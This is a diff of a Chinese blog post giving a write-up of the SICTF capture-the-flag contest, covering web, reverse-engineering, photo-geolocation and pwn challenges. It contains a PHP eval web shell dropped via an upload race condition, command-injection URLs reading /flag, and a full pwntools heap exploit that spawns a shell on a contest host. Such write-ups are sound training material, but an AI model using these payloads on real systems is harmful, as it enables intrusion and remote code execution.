@@ -20,18 +20,48 @@
   <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
   <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 
-  <meta name="description" content="WEB签到include![[Pasted image 20230908201141.png]]首先进入发现有SICTF传参，并且限制了前三个字符为php加上这里有include（）可推断为文件包含漏洞利用php伪协议 ![[Pasted image 20230908201343.png]]得到密文PD9waHAKJGZpbGVfcGF0aCA9ICIvZmxhZyI7CmlmIChmaWxlX2">
+  <meta name="description" content="WEB签到include首先进入发现有SICTF传参，并且限制了前三个字符为php加上这里有include（）可推断为文件包含漏洞利用php伪协议 得到密文PD9waHAKJGZpbGVfcGF0aCA9ICIvZmxhZyI7CmlmIChmaWxlX2V4aXN0cygkZmlsZV9wYXRoKSkgewogICAgJGZsYWcgPSBmaWxlX2dldF9jb250ZW50cygkZm">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SICTF wp">
 <meta property="og:url" content="http://example.com/2023/09/12/SICTF/index.html">
 <meta property="og:site_name" content="Delete&#39;s blog">
-<meta property="og:description" content="WEB签到include![[Pasted image 20230908201141.png]]首先进入发现有SICTF传参，并且限制了前三个字符为php加上这里有include（）可推断为文件包含漏洞利用php伪协议 ![[Pasted image 20230908201343.png]]得到密文PD9waHAKJGZpbGVfcGF0aCA9ICIvZmxhZyI7CmlmIChmaWxlX2">
+<meta property="og:description" content="WEB签到include首先进入发现有SICTF传参，并且限制了前三个字符为php加上这里有include（）可推断为文件包含漏洞利用php伪协议 得到密文PD9waHAKJGZpbGVfcGF0aCA9ICIvZmxhZyI7CmlmIChmaWxlX2V4aXN0cygkZmlsZV9wYXRoKSkgewogICAgJGZsYWcgPSBmaWxlX2dldF9jb250ZW50cygkZm">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-09-12T11:51:30.932Z">
-<meta property="article:modified_time" content="2023-09-12T11:53:47.704Z">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/1.jpg">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/2.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/4.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/5.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/6.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/7.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/8.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/9.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/10.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/11.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/12.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/13.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/14.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/15.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/16.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/17.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/18.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/19.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/caa448dc0beb40b4a5d2b4246e52ffb.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/caf8b84ebbc7460a98fe08e28f3f588.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/81578a716ab7767211ad77feb6c9531.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/20.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/64d2a8d114865207166b1ebf3cf1b9c.jpg">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/ff201efa1aae0f72b55ad43e457f4e9.jpg">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/a340c27e5d08f9f93fb77072e02fdc6.jpg">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/94b36b7d9d6b5d6441b81678714b111.png">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/50ed5762238d9b60e91d0ce8b7d93e1.jpg">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/b85c231b43fbc0706c651244cfe193b.jpg">
+<meta property="og:image" content="http://example.com/2023/09/12/SICTF/5b31ea98d29eb2026e33c7016ce095f.png">
+<meta property="article:published_time" content="2023-09-12T13:23:46.370Z">
+<meta property="article:modified_time" content="2023-09-12T13:54:51.405Z">
 <meta property="article:author" content="DELETE">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/09/12/SICTF/1.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Delete's blog" type="application/atom+xml">
   
@@ -229,7 +259,7 @@
 
         <div class='meta-info-bar'>
           <div class="meta-info">
-  <time class="dt-published" datetime="2023-09-12T11:51:30.932Z" itemprop="datePublished">2023-09-12</time>
+  <time class="dt-published" datetime="2023-09-12T13:23:46.370Z" itemprop="datePublished">2023-09-12</time>
 </div>
           <div class="need-seperator meta-info">
             <div class="meta-cate-flex">
@@ -240,7 +270,7 @@
   
           </div>
           <div class="wordcount need-seperator meta-info">
-            1.1k words 
+            997 words 
           </div>
         </div>
         
@@ -249,38 +279,38 @@
       </header>
       <div class="e-content article-entry" itemprop="articleBody">
         
-          <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到include"><a href="#签到include" class="headerlink" title="签到include"></a>签到include</h2><p>![[Pasted image 20230908201141.png]]<br>首先进入发现有SICTF传参，并且限制了前三个字符为php<br>加上这里有include（）可推断为文件包含漏洞<br>利用php伪协议</p>
-<p>![[Pasted image 20230908201343.png]]<br>得到密文<br>PD9waHAKJGZpbGVfcGF0aCA9ICIvZmxhZyI7CmlmIChmaWxlX2V4aXN0cygkZmlsZV9wYXRoKSkgewogICAgJGZsYWcgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZV9wYXRoKTsKfQplbHNlewogICAgZWNobyAiZXJyb3IiOwp9Cg&#x3D;&#x3D;</p>
+          <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到include"><a href="#签到include" class="headerlink" title="签到include"></a>签到include</h2><p><img src="/2023/09/12/SICTF/1.jpg"><br>首先进入发现有SICTF传参，并且限制了前三个字符为php<br>加上这里有include（）可推断为文件包含漏洞<br>利用php伪协议</p>
+<p><img src="/2023/09/12/SICTF/2.png"><br>得到密文<br>PD9waHAKJGZpbGVfcGF0aCA9ICIvZmxhZyI7CmlmIChmaWxlX2V4aXN0cygkZmlsZV9wYXRoKSkgewogICAgJGZsYWcgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZV9wYXRoKTsKfQplbHNlewogICAgZWNobyAiZXJyb3IiOwp9Cg&#x3D;&#x3D;</p>
 <p>base64解密</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file_path</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file_path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>可见直接读flag目录即可得到flag<br>![[Pasted image 20230908201515.png]]<br>解码得到<br>SICTF{ed2cb4ee-506f-47a8-821e-eb222183bad6}</p>
-<h2 id="PHP-baby"><a href="#PHP-baby" class="headerlink" title="PHP_baby"></a>PHP_baby</h2><p>进来先看源代码<br>![[Pasted image 20230908234327.png]]<br>发现对key做了限制<br>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/115050295">https://blog.csdn.net/mochu7777777/article/details/115050295</a><br>绕过<br>![[Pasted image 20230908234409.png]]</p>
+<p>可见直接读flag目录即可得到flag<br><img src="/2023/09/12/SICTF/4.png"><br>解码得到<br>SICTF{ed2cb4ee-506f-47a8-821e-eb222183bad6}</p>
+<h2 id="PHP-baby"><a href="#PHP-baby" class="headerlink" title="PHP_baby"></a>PHP_baby</h2><p>进来先看源代码<br><img src="/2023/09/12/SICTF/5.png"><br>发现对key做了限制<br>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/115050295">https://blog.csdn.net/mochu7777777/article/details/115050295</a><br>绕过<br><img src="/2023/09/12/SICTF/6.png"></p>
 <p>然后这里一眼无参数rce<br>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/157431794">https://zhuanlan.zhihu.com/p/157431794</a></p>
-<p>![[Pasted image 20230908234438.png]]</p>
-<h2 id="BABY-PHP"><a href="#BABY-PHP" class="headerlink" title="BABY_PHP"></a>BABY_PHP</h2><p>![[Pasted image 20230910004502.png]]</p>
-<p>看到对，和（做了限制<br>![[Pasted image 20230910004640.png]]</p>
-<p>绕过<br>然后试着读flag<br>![[Pasted image 20230910004726.png]]</p>
-<p>发现为空，所以决定看页面源代码<br>![[Pasted image 20230910004743.png]]</p>
+<p><img src="/2023/09/12/SICTF/7.png"></p>
+<h2 id="BABY-PHP"><a href="#BABY-PHP" class="headerlink" title="BABY_PHP"></a>BABY_PHP</h2><p><img src="/2023/09/12/SICTF/8.png"></p>
+<p>看到对，和（做了限制<br><img src="/2023/09/12/SICTF/9.png"></p>
+<p>绕过<br>然后试着读flag<br><img src="/2023/09/12/SICTF/10.png"></p>
+<p>发现为空，所以决定看页面源代码<br><img src="/2023/09/12/SICTF/11.png"></p>
 <p>所以这个和include那道题一样直接cat &#x2F;flag就行</p>
-<p>![[Pasted image 20230910004841.png]]<br>拿到flag</p>
-<h2 id="你能跟得上我的speed吗、"><a href="#你能跟得上我的speed吗、" class="headerlink" title="你能跟得上我的speed吗、"></a>你能跟得上我的speed吗、</h2><p>进来首先随便上传一个文件<br>![[Pasted image 20230910130318.png]]</p>
+<p><img src="/2023/09/12/SICTF/12.png"><br>拿到flag</p>
+<h2 id="你能跟得上我的speed吗、"><a href="#你能跟得上我的speed吗、" class="headerlink" title="你能跟得上我的speed吗、"></a>你能跟得上我的speed吗、</h2><p>进来首先随便上传一个文件<br><img src="/2023/09/12/SICTF/13.png"></p>
 <p>发现被秒删 然后思路就是条件竞争<br>上传4.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&#x27;&lt;?php eval($_GET[&quot;123&quot;]);?&gt;&#x27;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>burp一直发包然后写一个python’一直读这个文件</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    requests.get(<span class="string">&quot;http://210.44.151.51:10441/uploads/4.php&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;test&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<p>![[Pasted image 20230910131945.png]]<br>playload：<a target="_blank" rel="noopener" href="http://210.44.151.51:10441/uploads/1.php?123=phpinfo()">http://210.44.151.51:10441/uploads/1.php?123=phpinfo()</a>;</p>
-<p><a target="_blank" rel="noopener" href="http://210.44.151.51:10441/uploads/1.php?123=echo%20%60cat%20/flag">http://210.44.151.51:10441/uploads/1.php?123=echo%20`cat%20/flag</a>;<br>![[Pasted image 20230910132024.png]]</p>
+<p><img src="/2023/09/12/SICTF/14.png"><br>playload：<a target="_blank" rel="noopener" href="http://210.44.151.51:10441/uploads/1.php?123=phpinfo()">http://210.44.151.51:10441/uploads/1.php?123=phpinfo()</a>;</p>
+<p><a target="_blank" rel="noopener" href="http://210.44.151.51:10441/uploads/1.php?123=echo%20%60cat%20/flag">http://210.44.151.51:10441/uploads/1.php?123=echo%20`cat%20/flag</a>;<br><img src="/2023/09/12/SICTF/15.png"></p>
 <hr>
-<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><p>拿到一个文件<br>![[Pasted image 20230908225534.png]]</p>
-<p>直接txt查看<br>![[24d4aa3fb839427e1a92b1eeb2273bd.png]]</p>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><p>拿到一个文件<br><img src="/2023/09/12/SICTF/16.png"></p>
+<p>直接txt查看<br><img src="/2023/09/12/SICTF/17.png"></p>
 <p>get flag</p>
-<h2 id="virus"><a href="#virus" class="headerlink" title="virus"></a>virus</h2><p>![[351799a8dd5e2dd81da94e27f4dac1b.png]]<br>![[aa253f9b342b59deb0ab4a90a3b7459.png]]<br>![[caa448dc0beb40b4a5d2b4246e52ffb.png]]<br>![[caf8b84ebbc7460a98fe08e28f3f588.png]]</p>
-<p>![[81578a716ab7767211ad77feb6c9531.png]]</p>
+<h2 id="virus"><a href="#virus" class="headerlink" title="virus"></a>virus</h2><p>因为主办方不查wp，所以那边只要求交部分图片<br>so，没有写wp<br><img src="/2023/09/12/SICTF/18.png"><br><img src="/2023/09/12/SICTF/19.png"><br><img src="/2023/09/12/SICTF/caa448dc0beb40b4a5d2b4246e52ffb.png"><br><img src="/2023/09/12/SICTF/caf8b84ebbc7460a98fe08e28f3f588.png"></p>
+<p><img src="/2023/09/12/SICTF/81578a716ab7767211ad77feb6c9531.png"></p>
 <hr>
-<h1 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h1><h2 id="购物之旅"><a href="#购物之旅" class="headerlink" title="购物之旅"></a>购物之旅</h2><p>看见活动<br>![[Pasted image 20230908225706.png]]</p>
-<p>查找<br>![[64d2a8d114865207166b1ebf3cf1b9c.jpg]]<br>发现在顺义金街</p>
+<h1 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h1><h2 id="购物之旅"><a href="#购物之旅" class="headerlink" title="购物之旅"></a>购物之旅</h2><p>看见活动<br><img src="/2023/09/12/SICTF/20.png"></p>
+<p>查找<br><img src="/2023/09/12/SICTF/64d2a8d114865207166b1ebf3cf1b9c.jpg"><br>发现在顺义金街</p>
 <p>然后再看到BHG直接查询</p>
 <p>找到地址<br>北京市顺义区新顺南大街北京华联顺义金街购物中心</p>
 <h2 id="天桥"><a href="#天桥" class="headerlink" title="天桥"></a>天桥</h2><p>根据图片判断<br>1旁边为公交车2公家车专用车道城市有北京，天津，贵阳，郑州，大连，杭州，海口，南京，武汉，乌鲁木齐，厦门，西安，沈阳，银川，民和，上海，深圳3中间护栏为金色4护栏底座有平行花纹，柱头为金字塔形状，侧面大孩子有个圆形或人形图案5在网上查找照片仔细对比，符合上述条件为西安市政护栏5从西安寻找并仔细对比6从图片看出道路两旁树叶形状推断树大概为梧桐树7从上述条件查找得出答案</p>
@@ -289,18 +319,18 @@
 <p>陕西省西安市碑林区友谊西路</p>
 <h2 id="美丽的月光"><a href="#美丽的月光" class="headerlink" title="美丽的月光"></a>美丽的月光</h2><p>4.89 QkP:&#x2F; 复制打开抖音，看看# 网络迷踪 # 推理 # 冯柯南 网络迷踪：推理中环环相扣的逻辑 遗憾这是一次几乎失败的挑战 # … <a target="_blank" rel="noopener" href="https://v.douyin.com/ieAjDv3B/">https://v.douyin.com/ieAjDv3B/</a></p>
 <p>重庆市合川区秋季</p>
-<h2 id="宝塔镇河妖"><a href="#宝塔镇河妖" class="headerlink" title="宝塔镇河妖"></a>宝塔镇河妖</h2><p>百度识图<br>![[ff201efa1aae0f72b55ad43e457f4e9.jpg]]</p>
+<h2 id="宝塔镇河妖"><a href="#宝塔镇河妖" class="headerlink" title="宝塔镇河妖"></a>宝塔镇河妖</h2><p>百度识图<br><img src="/2023/09/12/SICTF/ff201efa1aae0f72b55ad43e457f4e9.jpg"></p>
 <p>直接找地点宝相寺</p>
 <p>山东省济宁市汶上县</p>
-<h2 id="美女姐姐"><a href="#美女姐姐" class="headerlink" title="美女姐姐"></a>美女姐姐</h2><p>百度识图<br>![[a340c27e5d08f9f93fb77072e02fdc6.jpg]]</p>
-<p>定位直接看<br>![[94b36b7d9d6b5d6441b81678714b111.png]]</p>
+<h2 id="美女姐姐"><a href="#美女姐姐" class="headerlink" title="美女姐姐"></a>美女姐姐</h2><p>百度识图<br><img src="/2023/09/12/SICTF/a340c27e5d08f9f93fb77072e02fdc6.jpg"></p>
+<p>定位直接看<br><img src="/2023/09/12/SICTF/94b36b7d9d6b5d6441b81678714b111.png"></p>
 <p>然后周围的公园<br>福建省福州市仓山区烟台山公园</p>
 <hr>
 <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>打开判断为下溢</p>
 <p>直接nc ip port</p>
-<p>买2**32-1000个 直接买flag<br>![[50ed5762238d9b60e91d0ce8b7d93e1.jpg]]</p>
-<p>![[b85c231b43fbc0706c651244cfe193b.jpg]]</p>
-<h2 id="BABY-HEAP"><a href="#BABY-HEAP" class="headerlink" title="BABY_HEAP"></a>BABY_HEAP</h2><p>IDA启动<br>![[5b31ea98d29eb2026e33c7016ce095f.png]]</p>
+<p>买2**32-1000个 直接买flag<br><img src="/2023/09/12/SICTF/50ed5762238d9b60e91d0ce8b7d93e1.jpg"></p>
+<p><img src="/2023/09/12/SICTF/b85c231b43fbc0706c651244cfe193b.jpg"></p>
+<h2 id="BABY-HEAP"><a href="#BABY-HEAP" class="headerlink" title="BABY_HEAP"></a>BABY_HEAP</h2><p>IDA启动<br><img src="/2023/09/12/SICTF/5b31ea98d29eb2026e33c7016ce095f.png"></p>
 <p>先申请16个堆块控制chunk_size作为伪块头</p>
 <p>0x100刚好溢出 能够在里面写0<br>然后house of orange手法拿到一块unsorted bin里的块<br>之后执行unsorted bin，拿下之前在块表里的伪块<br>unsorted bin attack*<br>之后利用got表拆出malloc地址 泄露libc 最后把malloc搞到one gadget上就能getshell</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;konsole&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./baby_heap&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;210.44.151.51&quot;</span>, <span class="number">10069</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./baby_heap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">return</span> u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct chunk_size</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">&quot;owo&quot;</span>)</span><br><span class="line">add(<span class="number">0x110</span>, <span class="string">&quot;awa&quot;</span>)</span><br><span class="line">add(<span class="number">0x1</span>, <span class="string">&quot;q&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">17</span>, <span class="number">0x30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0xdc1</span>))</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&quot;qwq&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">17</span>, <span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x111</span>) + p64(<span class="number">114514</span>) + p64(<span class="number">0x4040c8</span>))</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&quot;nya&quot;</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&quot;owo&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">20</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;malloc&#x27;</span>]))</span><br><span class="line">malloc_addr = show(<span class="number">0</span>)</span><br><span class="line">log.success(<span class="string">&quot;malloc_addr = &quot;</span> + <span class="built_in">hex</span>(malloc_addr))</span><br><span class="line">libc_base = malloc_addr - <span class="number">0x84180</span></span><br><span class="line">one_gadget_addr = <span class="number">0xf1247</span> + libc_base</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(one_gadget_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;233&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
